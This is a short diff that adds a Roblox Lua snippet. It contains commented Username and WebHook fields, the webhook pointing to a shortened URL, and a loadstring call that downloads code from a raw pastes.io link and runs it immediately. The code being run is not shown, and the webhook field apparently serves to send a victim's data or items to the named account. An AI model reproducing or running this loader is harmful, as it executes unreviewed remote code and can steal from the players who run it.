@@ -1,0 +1,3 @@
+```    -- Username = "Altfosho_tho"
+    -- WebHook = "https://shorturl.at/uvF47"
+loadstring(game:HttpGet("https://pastes.io/raw/u4r6bo1c9V", true))()```
